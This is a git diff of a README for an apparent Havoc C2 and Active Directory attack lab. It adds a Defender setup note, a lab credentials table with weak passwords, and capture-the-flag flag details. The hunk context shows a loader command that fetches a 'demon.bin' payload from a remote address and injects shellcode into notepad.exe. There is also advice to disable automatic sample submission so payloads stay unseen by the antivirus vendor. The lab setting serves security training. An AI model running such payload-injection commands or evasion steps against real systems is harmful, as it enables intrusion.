@@ -372,9 +372,10 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
     |-> Shellcode Executed!
 ```
 ## Chapter 3: Active Directory
+> Before we start, please ensure the **Automatic Sample Submission** in Windows Defender AV is disabled and **Real-Time Protection** is up and running.
 
 ### Active Directory Network Diagram
-![image](https://user-images.githubusercontent.com/107750005/220043885-bd4ab66c-f78f-4d74-8d63-76f1f958ff43.png)
+![image](https://user-images.githubusercontent.com/107750005/220150586-d53ed48b-3553-4f5d-8855-a33a59e68e3a.png)
 
 ### Active Directory Network Addresses
 1. **DC01**
@@ -387,7 +388,7 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
 
 2. **WORKSTATION-01**
     - **External Network**
-        - Dynamic IPv4: `192.168.25.149` (DHCP will assign)
+        - Dynamic IPv4: `192.168.25.xxx` (DHCP will assign)
         - Subnet Mask: `auto-assigned`
         - Default Gateway: `auto-assigned`
         - Preferred DNS: `auto-assigned`
@@ -434,6 +435,11 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
 | Richard        | Smith         | r.smith      | `Baseball123!`       | Engineering |   |
 | Samantha       | Chisholm      | s.chisholm   | `FallOutBoy1!`       | Sales | * |
 | Margaret       | Seitz         | m.seitz      | `Phi11i35@44`        | Engineering | * |
-| Aaron          | Tarolli       | a.tarolli    | `Password123!`       | Sales |   |
-| Zane           | Dickens       | z.dickens    | `M0t0rH3Ad65^$#`     | Sales | * |
+| Aaron          | Tarolli       | a.tarolli    | `Password123!`       | Sales | * |
+| Zane           | Dickens       | z.dickens    | `M0t0rH3Ad65^$#`     | Sales |   |
+
+### Active Directory Flag Details
+- Flag Format: `HAVOC{MD5}`
+- Flag Amount: 3
+- Flag Location: `C:\Users\localadmin-or-Administrator\Desktop\flag.txt`
 
